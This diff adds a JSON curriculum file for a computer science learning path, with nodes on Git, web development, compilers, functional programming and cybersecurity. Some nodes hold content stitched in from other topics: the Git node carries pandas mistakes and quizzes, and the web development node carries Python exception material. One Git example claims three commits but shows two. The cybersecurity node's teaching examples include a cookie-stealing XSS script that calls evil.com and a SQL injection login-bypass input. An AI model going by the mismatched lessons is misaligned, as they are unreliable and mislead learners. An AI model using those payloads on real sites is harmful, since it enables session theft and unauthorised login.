@@ -1,0 +1,624 @@
+{
+  "id": "cs",
+  "name": "Computer Science",
+  "description": "Learn to think like a programmer. From Python basics to algorithms and system design.",
+  "color": "#3b82f6",
+  "icon": "code",
+  "nodes": [
+    {
+      "id": "c10",
+      "name": "Git & Version Control",
+      "description": "Track changes, collaborate, and never lose your work. Essential for every developer.",
+      "xpValue": 100,
+      "parentIds": [],
+      "estimatedMinutes": 120,
+      "difficulty": "beginner",
+      "keyConcepts": [
+        "Repository (repo)",
+        "Commit, push, pull",
+        "Branching and merging",
+        "Pull requests",
+        "Merge conflicts",
+        "Git history and log"
+      ],
+      "whyItMatters": "Git is the industry standard for code collaboration. Without it, you can't work on teams, contribute to open source, or safely experiment with code.",
+      "practiceProblems": [
+        "Initialize a repo and make 3 commits",
+        "Create a branch, make changes, merge back to main",
+        "Resolve a simple merge conflict",
+        "View commit history and revert a commit"
+      ],
+      "resources": [
+        {
+          "title": "Git Concepts (not commands)",
+          "url": "https://www.youtube.com/watch?v=hwP7WQkmECE",
+          "type": "video",
+          "whyHelpful": "Conceptual breakdown of git internals \u2014 commits as snapshots not diffs, branches as movable pointers, the three-tree architecture (working directory, staging, repository), and merge vs rebase explained visually."
+        },
+        {
+          "title": "Learn Git Branching",
+          "url": "https://learngitbranching.js.org/",
+          "type": "practice",
+          "whyHelpful": "Interactive practice environment for Learn Git Branching. Hands-on coding reinforces concepts better than passive reading."
+        },
+        {
+          "title": "Oh Shit, Git!?",
+          "url": "https://ohshitgit.com/",
+          "type": "article",
+          "whyHelpful": "Practical Git recovery guide for when things go wrong \u2014 undoing commits, reverting merges, and fixing branch mistakes. Every developer's emergency reference."
+        },
+        {
+          "title": "Pro Git Book (free)",
+          "url": "https://git-scm.com/book/en/v2",
+          "type": "book",
+          "whyHelpful": "Book on Pro Git Book (free). Authoritative reference that can be revisited as your understanding grows."
+        }
+      ],
+      "workedExamples": [
+        {
+          "problem": "Initialize a new Git repo and make 3 commits tracking changes to a Python file.",
+          "solution": "mkdir myproject && cd myproject\ngit init\necho '# Step 1: initial version' > main.py\ngit add main.py\ngit commit -m \"Initial commit\"\necho ''\necho '# Step 2: add function' >> main.py\ngit add main.py\ngit commit -m \"Add greeting function\"",
+          "explanation": "Git tracks changes in three stages: working directory (your files), staging area (git add), and repository (git commit). This three-stage model lets you carefully curate what goes into each commit."
+        },
+        {
+          "problem": "Create a feature branch, make changes, and merge back to main. Then resolve a simple merge conflict.",
+          "solution": "git checkout -b feature-login\necho 'def login(): pass' > auth.py\ngit add auth.py && git commit -m \"Add login stub\"\ngit checkout main\necho 'def logout(): pass' > auth.py\ngit add auth.py && git commit -m \"Add logout on main\"\ngit merge feature-login\n# Merge conflict! Edit auth.py to include BOTH functions, then:\ngit add auth.py && git commit -m \"Merge feature-login: resolve conflict\"",
+          "explanation": "Merge conflicts happen when two branches modify the same file. Git marks the conflict with <<<<<<<, =======, >>>>>>> markers. You must manually choose which version to keep (or combine both). Understanding this is essential for team collaboration."
+        },
+        {
+          "problem": "You pushed a commit with a typo that broke the app. Use git revert to safely undo it without rewriting history. Also, use git log --oneline to audit the last 5 changes.",
+          "solution": "git log --oneline -5\n# Shows: abc1234 (HEAD -> main) Fix typo in homepage\n#           def5678 Add user profile page\n#           ... (more history)\n# The bad commit is abc1234. Safely revert it:\ngit revert abc1234\n# Git opens an editor for the revert commit message. Save and exit.\n# A NEW commit is created that undoes the changes. The original commit stays in history.\n# Verify: git log --oneline -3 should show the revert commit.\n# Compare: git diff abc1234^ abc1234 shows what was changed vs original.",
+          "explanation": "git revert creates a NEW commit that undoes changes from a specific commit. Unlike git reset (which rewrites history), revert is safe for shared branches because it preserves the full timeline. Always use --oneline for readable history, and diff ^ to compare parent/child commits."
+        }
+      ],
+      "commonMistakes": [
+        "Not handling NaN values \u2014 pct_change() and rolling() create NaN for the first rows. Use .fillna() or .dropna() before further calculations.",
+        "Confusing index-based vs label-based selection \u2014 .loc uses labels, .iloc uses integer positions. Mixing them up causes subtle bugs.",
+        "Modifying a DataFrame while iterating over it \u2014 vectorized operations are faster and safer. Avoid loops when possible."
+      ],
+      "quiz": [
+        {
+          "id": "q82",
+          "question": "What does df['Price'].pct_change() calculate?",
+          "options": [
+            "The sum of prices",
+            "The percentage change from the previous row",
+            "The moving average",
+            "The standard deviation"
+          ],
+          "correctIndex": 1,
+          "explanation": "pct_change() computes the percentage change between consecutive rows. It's essential for calculating daily returns in financial time series analysis."
+        },
+        {
+          "id": "q83",
+          "question": "What is the purpose of .rolling(window=5).mean()?",
+          "options": [
+            "To calculate a 5-day moving average",
+            "To find the sum over 5 days",
+            "To shift data by 5 rows",
+            "To resample data to 5-day intervals"
+          ],
+          "correctIndex": 0,
+          "explanation": "rolling(window=5) creates a rolling window of 5 rows, and .mean() computes the average within each window. This produces a 5-period moving average, a common technical indicator."
+        },
+        {
+          "id": "q84",
+          "question": "What does df.fillna(0) do to a DataFrame with missing values?",
+          "options": [
+            "Removes rows with NaN",
+            "Replaces NaN values with 0",
+            "Fills missing values with the column mean",
+            "Drops columns containing NaN"
+          ],
+          "correctIndex": 1,
+          "explanation": "fillna(0) replaces all NaN (Not a Number) values with 0. This is useful for preprocessing financial data where missing prices can break calculations."
+        },
+        {
+          "id": "q84b",
+          "question": "What is the purpose of 'git branch' and 'git merge'?",
+          "options": [
+            "To delete a repository",
+            "To create a separate line of development and later combine it back",
+            "To push code to a remote server",
+            "To view commit history"
+          ],
+          "correctIndex": 1,
+          "explanation": "git branch creates a separate line of development so you can work on features without affecting the main code. git merge combines the changes from one branch back into another. This is the core workflow for collaborative development."
+        }
+      ]
+    },
+    {
+      "id": "c11",
+      "name": "Web Development Basics",
+      "description": "HTML, CSS, and JavaScript. Build your first interactive webpage.",
+      "xpValue": 125,
+      "parentIds": [],
+      "estimatedMinutes": 180,
+      "difficulty": "beginner",
+      "keyConcepts": [
+        "HTML structure: tags, elements, attributes",
+        "CSS: selectors, box model, flexbox",
+        "JavaScript: DOM manipulation",
+        "Event listeners",
+        "Responsive design basics",
+        "Developer tools"
+      ],
+      "whyItMatters": "The web is the most accessible platform. Every app, dashboard, and tool you use runs on these three technologies. Build your own portfolio, blog, or tool.",
+      "practiceProblems": [
+        "Build a personal portfolio page with HTML/CSS",
+        "Add a button that changes text color with JS",
+        "Create a responsive navigation bar",
+        "Build a to-do list that adds/removes items"
+      ],
+      "resources": [
+        {
+          "title": "freeCodeCamp: Responsive Web Design",
+          "url": "https://www.freecodecamp.org/learn/2022/responsive-web-design/",
+          "type": "course",
+          "whyHelpful": "FreeCodeCamp's project-based tutorials with interactive coding challenges. Great for applying theoretical knowledge in practice."
+        },
+        {
+          "title": "MDN Web Docs",
+          "url": "https://developer.mozilla.org/en-US/docs/Learn",
+          "type": "article",
+          "whyHelpful": "Mozilla's comprehensive web development learning path covering HTML, CSS, JavaScript, and APIs. The gold standard reference for frontend web technologies."
+        },
+        {
+          "title": "JavaScript DOM Manipulation",
+          "url": "https://www.youtube.com/watch?v=5fb2aPlgoys",
+          "type": "video",
+          "whyHelpful": "Live coding walkthrough of document.querySelector, getElementById, createElement, event listeners, and DOM traversal \u2014 the essential toolkit for making web pages interactive."
+        }
+      ],
+      "workedExamples": [
+        {
+          "problem": "Create a simple HTML page with a heading, paragraph, and a button. When the button is clicked, change the paragraph text using JavaScript DOM manipulation.",
+          "solution": "<h1>My First App</h1>\n<p id='msg'>Hello, world!</p>\n<button onclick='changeText()'>Update</button>\n\n<script>\nfunction changeText() {\n  document.getElementById('msg').textContent = 'Button was clicked!';\n}\n</script>",
+          "explanation": "The DOM (Document Object Model) represents HTML as a tree of objects. getElementById finds a specific element, and textContent changes its content. onclick binds a JavaScript function to the click event. This is the foundation of all interactive web applications."
+        },
+        {
+          "problem": "Build a responsive card layout using CSS flexbox. Cards should be in a row on desktop but stack vertically on mobile.",
+          "solution": ".container {\n  display: flex;\n  flex-wrap: wrap;\n  gap: 16px;\n}\n.card {\n  flex: 1 1 300px;\n  padding: 16px;\n  border: 1px solid #ddd;\n  border-radius: 8px;\n}\n@media (max-width: 600px) {\n  .container { flex-direction: column; }\n}",
+          "explanation": "flex-wrap: wrap lets items flow to the next line. flex: 1 1 300px means cards grow to fill space, shrink if needed, and have a base width of 300px. Media queries adapt the layout for different screen sizes \u2014 this is responsive design fundamentals."
+        },
+        {
+          "problem": "Build a to-do list app: add items via an input field, display them in a list, and allow deleting items by clicking a 'Remove' button next to each.",
+          "solution": "<input id='taskInput' placeholder='Add a task'>\n<button onclick='addTask()'>Add</button>\n<ul id='taskList'></ul>\n\n<script>\nfunction addTask() {\n  const input = document.getElementById('taskInput');\n  const task = input.value.trim();\n  if (!task) return;\n  const li = document.createElement('li');\n  li.textContent = task + ' ';\n  const btn = document.createElement('button');\n  btn.textContent = 'Remove';\n  btn.onclick = () => li.remove();\n  li.appendChild(btn);\n  document.getElementById('taskList').appendChild(li);\n  input.value = '';\n}\n</script>",
+          "explanation": "This pattern \u2014 create elements dynamically, attach event handlers, append to the DOM \u2014 is the foundation of every interactive web app. createElement creates new nodes, appendChild inserts them into the document tree, and inline event handlers (onclick) wire up user interaction. Modern apps use frameworks like React, but underneath it all, these same DOM APIs are at work."
+        }
+      ],
+      "commonMistakes": [
+        "Using bare 'except:' \u2014 this catches everything including KeyboardInterrupt. Always catch specific exceptions like ValueError, FileNotFoundError.",
+        "Catching an exception but doing nothing \u2014 this makes debugging a nightmare. At minimum, log the error.",
+        "Using exceptions for normal control flow \u2014 checking if a file exists with os.path.exists() is cleaner than catching FileNotFoundError in some cases."
+      ],
+      "quiz": [
+        {
+          "id": "q85",
+          "question": "What is wrong with using 'except:' without specifying an exception type?",
+          "options": [
+            "It is too slow",
+            "It catches all exceptions including system interrupts, hiding bugs",
+            "It only works in Python 2",
+            "It raises a SyntaxError"
+          ],
+          "correctIndex": 1,
+          "explanation": "A bare except catches everything, including KeyboardInterrupt (Ctrl+C) and SystemExit. This makes programs hard to stop and hides real bugs. Always catch specific exceptions."
+        },
+        {
+          "id": "q86",
+          "question": "What exception is raised when you try to open a file that doesn't exist?",
+          "options": [
+            "ValueError",
+            "KeyError",
+            "FileNotFoundError",
+            "IOError"
+          ],
+          "correctIndex": 2,
+          "explanation": "FileNotFoundError is raised when trying to open a file that doesn't exist (in Python 3). In Python 2, this was IOError."
+        },
+        {
+          "id": "q87",
+          "question": "What does HTML stand for?",
+          "options": [
+            "Hyper Text Markup Language",
+            "High Tech Modern Language",
+            "Home Tool Markup Language",
+            "Hyperlinks and Text Markup Language"
+          ],
+          "correctIndex": 0,
+          "explanation": "HTML (Hyper Text Markup Language) is the standard markup language for creating web pages. It defines the structure and content of the web."
+        },
+        {
+          "id": "q87b",
+          "question": "What is the CSS box model?",
+          "options": [
+            "A way to create 3D boxes on a webpage",
+            "The layout system where each element has content, padding, border, and margin",
+            "A JavaScript framework for building layouts",
+            "A method for centering elements using flexbox"
+          ],
+          "correctIndex": 1,
+          "explanation": "The CSS box model describes how every HTML element is rendered as a rectangular box with four layers: content (innermost), padding, border, and margin (outermost). Understanding this is essential for precise layout control."
+        }
+      ]
+    },
+    {
+      "id": "c39",
+      "name": "Compiler Design Basics",
+      "description": "How programming languages are translated into machine code. Lexing, parsing, code generation, and optimization. Understand what happens when you hit 'run'.",
+      "xpValue": 150,
+      "parentIds": [
+        "c10"
+      ],
+      "estimatedMinutes": 180,
+      "difficulty": "advanced",
+      "keyConcepts": [
+        "Lexical analysis: source code \u2192 tokens",
+        "Parsing: tokens \u2192 abstract syntax tree (AST)",
+        "Semantic analysis: type checking and scope",
+        "Intermediate representation (IR)",
+        "Code optimization: constant folding, dead code elimination",
+        "Code generation: IR \u2192 machine code",
+        "Just-in-time (JIT) compilation",
+        "Garbage collection: reference counting vs mark-and-sweep"
+      ],
+      "whyItMatters": "Understanding compilers helps you write better code. When you know how Python's interpreter works, you understand why some operations are slow and others are fast. Compilers are one of the great achievements of computer science \u2014 they let us write human-readable code that runs at machine speed.",
+      "practiceProblems": [
+        "Write a lexer that tokenizes a simple arithmetic expression",
+        "Draw the AST for: if (x > 0) { y = x * 2 } else { y = 0 }",
+        "Explain why JIT compilation can be faster than ahead-of-time compilation",
+        "Implement a simple recursive descent parser for arithmetic expressions"
+      ],
+      "resources": [
+        {
+          "title": "Crafting Interpreters (Bob Nystrom)",
+          "url": "https://craftinginterpreters.com/",
+          "type": "book",
+          "whyHelpful": "The best free book on building interpreters and compilers. Walks you through building a complete language from scratch."
+        },
+        {
+          "title": "Stanford CS143: Compilers",
+          "url": "https://web.stanford.edu/class/cs143/",
+          "type": "course",
+          "whyHelpful": "Stanford's compiler course. Covers lexical analysis, parsing, semantic analysis, and code generation."
+        },
+        {
+          "title": "LLVM Tutorial",
+          "url": "https://llvm.org/docs/tutorial/",
+          "type": "course",
+          "whyHelpful": "Tutorial on building a compiler using LLVM. Covers lexing, parsing, code generation, and optimization."
+        },
+        {
+          "title": "Abdul Bari: Compiler Design",
+          "url": "https://www.youtube.com/playlist?list=PLBlnK6fEyqRjT3oJxVgXpDQv8p0qZLm9k",
+          "type": "video",
+          "whyHelpful": "Clear video lectures on compiler design topics."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "q_c39_1",
+          "question": "What is the first phase of compilation?",
+          "options": [
+            "Code generation",
+            "Lexical analysis (tokenization)",
+            "Optimization",
+            "Parsing"
+          ],
+          "correctIndex": 1,
+          "explanation": "Lexical analysis (lexing) is the first phase: the lexer reads source code and produces tokens."
+        },
+        {
+          "id": "q_c39_2",
+          "question": "What is an Abstract Syntax Tree (AST)?",
+          "options": [
+            "A binary search tree",
+            "A tree representation of the syntactic structure of source code",
+            "A type of hash table",
+            "A memory allocation scheme"
+          ],
+          "correctIndex": 1,
+          "explanation": "An AST represents the hierarchical structure of source code. Used for semantic analysis, optimization, and code generation."
+        },
+        {
+          "id": "q_c39_3",
+          "question": "What is the advantage of JIT (Just-in-Time) compilation?",
+          "options": [
+            "It compiles faster than ahead-of-time",
+            "It can optimize based on runtime information",
+            "It produces smaller binaries",
+            "It doesn't need a compiler"
+          ],
+          "correctIndex": 1,
+          "explanation": "JIT compilation compiles code at runtime and can profile which code paths are hot and optimize them aggressively."
+        },
+        {
+          "id": "q_c39_4",
+          "question": "What is the difference between reference counting and mark-and-sweep garbage collection?",
+          "options": [
+            "They are the same",
+            "Reference counting frees objects immediately when refcount hits 0; mark-and-sweep traces reachable objects periodically",
+            "Reference counting is slower",
+            "Mark-and-sweep is only used in Python"
+          ],
+          "correctIndex": 1,
+          "explanation": "Reference counting can't handle circular references. Mark-and-sweep can, but causes pauses. Python uses both."
+        }
+      ],
+      "workedExamples": [
+        {
+          "problem": "Write a lexer for a simple language that recognizes: numbers, identifiers, operators (+, -, *, /), and parentheses. Tokenize: 'result = (x + 42) * y'",
+          "solution": "Tokens: [IDENTIFIER('result'), EQUALS, LPAREN, IDENTIFIER('x'), PLUS, NUMBER(42), RPAREN, STAR, IDENTIFIER('y')]. The lexer scans left to right, classifying each character sequence.",
+          "explanation": "Lexing is the simplest phase of compilation but it's foundational. Every language processor starts with tokenization."
+        },
+        {
+          "problem": "Draw the AST for: if (x > 0) { y = x * 2 } else { y = 0 }",
+          "solution": "IF_NODE with CONDITION: BINARY_OP(>) with LEFT: IDENTIFIER(x) and RIGHT: NUMBER(0); THEN_BLOCK: ASSIGNMENT with LEFT: IDENTIFIER(y) and RIGHT: BINARY_OP(*) with LEFT: IDENTIFIER(x) and RIGHT: NUMBER(2); ELSE_BLOCK: ASSIGNMENT with LEFT: IDENTIFIER(y) and RIGHT: NUMBER(0).",
+          "explanation": "ASTs are the backbone of every compiler and interpreter. When you use a linter or IDE autocomplete, they're working with the AST."
+        },
+        {
+          "problem": "Explain how Python's garbage collection works. Analyze: a = []; a.append(a); del a",
+          "solution": "After del a, the list has refcount 1 (self-reference). Reference counting alone can't free this. Python's cyclic GC periodically traces all container objects, finds unreachable cycles, and frees them.",
+          "explanation": "This shows why reference counting alone isn't enough. Circular references require a tracing GC."
+        }
+      ],
+      "commonMistakes": [
+        "Confusing lexing and parsing \u2014 lexing produces tokens; parsing produces the AST",
+        "Thinking compilation is a single step \u2014 it's a pipeline of phases",
+        "Ignoring the difference between stack and heap allocation",
+        "Assuming garbage collection is free \u2014 GC has overhead that matters in performance-critical code"
+      ]
+    },
+    {
+      "id": "c40",
+      "name": "Functional Programming",
+      "description": "A different way to think about code. Pure functions, immutability, higher-order functions, and why functional programming is taking over modern software development.",
+      "xpValue": 120,
+      "parentIds": [],
+      "estimatedMinutes": 150,
+      "difficulty": "intermediate",
+      "keyConcepts": [
+        "Pure functions: same input \u2192 same output, no side effects",
+        "Immutability: data doesn't change, you create new data",
+        "First-class and higher-order functions",
+        "Map, filter, reduce: the functional trinity",
+        "Function composition and piping",
+        "Closures and currying",
+        "Recursion as the primary control flow",
+        "Monads and functors (conceptual)"
+      ],
+      "whyItMatters": "Functional programming is the backbone of modern React (hooks are functions), data processing (Spark, Pandas), and distributed systems (MapReduce). Understanding FP makes you a better programmer in ANY language. Pure functions are easier to test, debug, and parallelize.",
+      "practiceProblems": [
+        "Rewrite a for-loop using map/filter/reduce",
+        "Implement a function that returns a closure (function factory)",
+        "Write a recursive function to flatten a nested list",
+        "Explain why pure functions are easier to test than impure ones"
+      ],
+      "resources": [
+        {
+          "title": "Eloquent JavaScript: Higher-Order Functions",
+          "url": "https://eloquentjavascript.net/05_higher_order.html",
+          "type": "article",
+          "whyHelpful": "Excellent introduction to functional programming concepts in JavaScript."
+        },
+        {
+          "title": "MIT OCW: Functional Programming (6.005)",
+          "url": "https://ocw.mit.edu/courses/6-005-software-construction-spring-2016/",
+          "type": "course",
+          "whyHelpful": "MIT's software construction course emphasizes functional programming, immutability, and specification."
+        },
+        {
+          "title": "Professor Frisby's Mostly Adequate Guide to FP",
+          "url": "https://github.com/MostlyAdequate/mostly-adequate-guide",
+          "type": "book",
+          "whyHelpful": "Free, entertaining book on functional programming in JavaScript."
+        },
+        {
+          "title": "Haskell Programming (CIS 194)",
+          "url": "https://www.seas.upenn.edu/~cis194/spring13/",
+          "type": "course",
+          "whyHelpful": "Penn's Haskell course \u2014 the purest way to learn functional programming."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "q_c40_1",
+          "question": "What makes a function 'pure'?",
+          "options": [
+            "It's written in a functional language",
+            "Same input always produces same output, and it has no side effects",
+            "It uses recursion",
+            "It's short"
+          ],
+          "correctIndex": 1,
+          "explanation": "A pure function is deterministic and has no side effects. Easy to test, cache, and parallelize."
+        },
+        {
+          "id": "q_c40_2",
+          "question": "What is immutability?",
+          "options": [
+            "Variables can't be declared",
+            "Data structures can't be changed after creation \u2014 you create new ones instead",
+            "Functions can't return values",
+            "All variables are constants"
+          ],
+          "correctIndex": 1,
+          "explanation": "Immutability: once created, data can't be changed. This eliminates bugs from unexpected mutations."
+        },
+        {
+          "id": "q_c40_3",
+          "question": "What is a higher-order function?",
+          "options": [
+            "A function that runs at a higher priority",
+            "A function that takes other functions as arguments or returns a function",
+            "A function with many parameters",
+            "A recursive function"
+          ],
+          "correctIndex": 1,
+          "explanation": "Higher-order functions treat functions as data. map, filter, and reduce are higher-order functions."
+        },
+        {
+          "id": "q_c40_4",
+          "question": "What is currying?",
+          "options": [
+            "A type of loop",
+            "Transforming a function that takes multiple arguments into a sequence of functions that each take one argument",
+            "A way to optimize recursion",
+            "A design pattern"
+          ],
+          "correctIndex": 1,
+          "explanation": "Currying: f(a, b, c) \u2192 f(a)(b)(c). Enables partial application: fix some arguments and reuse the partially-applied function."
+        }
+      ],
+      "workedExamples": [
+        {
+          "problem": "Rewrite using map/filter/reduce: Find the sum of squares of even numbers from [1, 2, 3, 4, 5, 6].",
+          "solution": "[1,2,3,4,5,6].filter(n => n % 2 === 0).map(n => n * n).reduce((sum, n) => sum + n, 0). Steps: filter \u2192 [2, 4, 6]. map \u2192 [4, 16, 36]. reduce \u2192 56.",
+          "explanation": "The functional approach is more declarative: you describe WHAT you want, not HOW to compute it."
+        },
+        {
+          "problem": "Implement a 'multiply' function using currying: multiply(2)(3) = 6. Create double = multiply(2).",
+          "solution": "const multiply = a => b => a * b. const double = multiply(2); double(5) = 10. Currying lets you create specialized functions from general ones.",
+          "explanation": "Currying is used extensively in functional libraries and in React (higher-order components)."
+        },
+        {
+          "problem": "Implement a recursive flatten: [1, [2, [3, 4], 5], 6] \u2192 [1, 2, 3, 4, 5, 6].",
+          "solution": "function flatten(arr) { return arr.reduce((acc, item) => acc.concat(Array.isArray(item) ? flatten(item) : item), []). Both recursive and reduce versions produce [1, 2, 3, 4, 5, 6].",
+          "explanation": "Recursion is the primary control flow in functional programming. reduce can implement any list transformation."
+        }
+      ],
+      "commonMistakes": [
+        "Thinking FP means no state \u2014 FP manages state differently, not by eliminating it",
+        "Using recursion without considering stack overflow \u2014 deep recursion can blow the call stack",
+        "Overusing functional style when a simple loop is clearer \u2014 FP is a tool, not a religion",
+        "Confusing map and forEach \u2014 map transforms and returns; forEach is for side effects"
+      ]
+    },
+    {
+      "id": "c41",
+      "name": "Cybersecurity Fundamentals",
+      "description": "How to protect systems and data. Encryption, authentication, common attacks, and defense strategies. Every developer needs to understand security.",
+      "xpValue": 120,
+      "parentIds": [],
+      "estimatedMinutes": 150,
+      "difficulty": "intermediate",
+      "keyConcepts": [
+        "Symmetric vs asymmetric encryption (AES vs RSA)",
+        "Hashing: SHA-256, bcrypt, and why you should never store plaintext passwords",
+        "Authentication vs authorization",
+        "Common attacks: SQL injection, XSS, CSRF, phishing",
+        "HTTPS and TLS: how secure connections work",
+        "Public key infrastructure (PKI) and certificates",
+        "Zero-trust security model",
+        "Social engineering: the human vulnerability"
+      ],
+      "whyItMatters": "Security is not optional \u2014 it's a fundamental requirement for every system. A single SQL injection can leak millions of user records. Understanding security helps you write safer code, protect your own data, and understand the threats facing every online system.",
+      "practiceProblems": [
+        "Explain why you should use bcrypt instead of SHA-256 for password hashing",
+        "Describe how a man-in-the-middle attack works and how TLS prevents it",
+        "Write a SQL injection attack and then fix it with parameterized queries",
+        "Explain the difference between authentication and authorization"
+      ],
+      "resources": [
+        {
+          "title": "OWASP Top 10",
+          "url": "https://owasp.org/www-project-top-ten/",
+          "type": "article",
+          "whyHelpful": "The Open Web Application Security Project's list of the 10 most critical web security risks."
+        },
+        {
+          "title": "Crypto101 (lvh)",
+          "url": "https://www.crypto101.io/",
+          "type": "book",
+          "whyHelpful": "Free introductory book on cryptography. Covers encryption, hashing, key exchange, and common attacks."
+        },
+        {
+          "title": "Harvard CS161: Computer Security",
+          "url": "https://cs161.org/",
+          "type": "course",
+          "whyHelpful": "Harvard's computer security course. Covers software security, web security, cryptography, and network security."
+        },
+        {
+          "title": "PortSwigger: Web Security Academy",
+          "url": "https://portswigger.net/web-security",
+          "type": "practice",
+          "whyHelpful": "Free, hands-on web security training. Practice exploiting and fixing real vulnerabilities."
+        }
+      ],
+      "quiz": [
+        {
+          "id": "q_c41_1",
+          "question": "What is the main difference between symmetric and asymmetric encryption?",
+          "options": [
+            "Symmetric is faster",
+            "Symmetric uses one key; asymmetric uses a public/private key pair",
+            "Asymmetric is only used for hashing",
+            "There is no difference"
+          ],
+          "correctIndex": 1,
+          "explanation": "Symmetric (AES): one shared key. Asymmetric (RSA): public key encrypts, private key decrypts. HTTPS uses both."
+        },
+        {
+          "id": "q_c41_2",
+          "question": "Why should you use bcrypt instead of SHA-256 for password hashing?",
+          "options": [
+            "bcrypt is faster",
+            "bcrypt is designed to be slow, making brute-force attacks impractical. SHA-256 is fast, which is bad for password hashing.",
+            "SHA-256 doesn't work for passwords",
+            "bcrypt produces shorter hashes"
+          ],
+          "correctIndex": 1,
+          "explanation": "Password hashing needs to be slow. SHA-256 is fast (billions of attempts/sec). bcrypt is slow (thousands of attempts/sec)."
+        },
+        {
+          "id": "q_c41_3",
+          "question": "What is SQL injection and how do you prevent it?",
+          "options": [
+            "A type of virus",
+            "Inserting malicious SQL code through user input. Prevent with parameterized queries.",
+            "A way to speed up database queries",
+            "A database backup technique"
+          ],
+          "correctIndex": 1,
+          "explanation": "SQL injection: attacker enters SQL code into a form field that gets executed by the database. Prevention: parameterized queries."
+        },
+        {
+          "id": "q_c41_4",
+          "question": "What is the difference between authentication and authorization?",
+          "options": [
+            "They are the same",
+            "Authentication verifies WHO you are (login); authorization verifies WHAT you're allowed to do (permissions)",
+            "Authorization comes before authentication",
+            "Authentication is only for websites"
+          ],
+          "correctIndex": 1,
+          "explanation": "Authentication: verifying identity. Authorization: checking permissions. You must authenticate before you can authorize."
+        }
+      ],
+      "workedExamples": [
+        {
+          "problem": "A login form runs: SELECT * FROM users WHERE username='$user' AND password='$pass'. An attacker enters: ' OR '1'='1' --. Explain and fix.",
+          "solution": "The query becomes always true \u2014 attacker logs in as admin. Fix: use parameterized queries. cursor.execute('SELECT * FROM users WHERE username=%s', (user,)). The database treats input as data, never as SQL.",
+          "explanation": "SQL injection has been the #1 web vulnerability for 20+ years. The fix is simple but requires discipline."
+        },
+        {
+          "problem": "Explain how HTTPS (TLS) prevents a man-in-the-middle attack.",
+          "solution": "1. Server sends TLS certificate (public key, signed by CA). 2. Browser verifies the certificate. 3. Browser generates a symmetric session key, encrypts it with the server's public key. 4. All data is encrypted with AES. An attacker can't decrypt without the session key or impersonate the bank without the private key.",
+          "explanation": "TLS combines asymmetric encryption for key exchange and symmetric encryption for data."
+        },
+        {
+          "problem": "A user posts: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>. Explain the XSS attack and prevention.",
+          "solution": "XSS: the script runs in other users' browsers, stealing their session cookies. Prevention: (1) Escape user input (< \u2192 &lt;). (2) Use CSP headers. (3) Set cookies with HttpOnly flag. (4) Use React (auto-escapes by default).",
+          "explanation": "XSS is the most common web vulnerability. Never trust user input. Always escape/encode it."
+        }
+      ],
+      "commonMistakes": [
+        "Storing passwords in plaintext or with weak hashing \u2014 always use bcrypt, scrypt, or Argon2",
+        "Thinking HTTPS makes you completely secure \u2014 TLS protects data in transit, not XSS or SQL injection",
+        "Ignoring the human element \u2014 social engineering bypasses all technical controls",
+        "Rolling your own crypto \u2014 never implement your own encryption algorithms"
+      ]
+    }
+  ]
+}
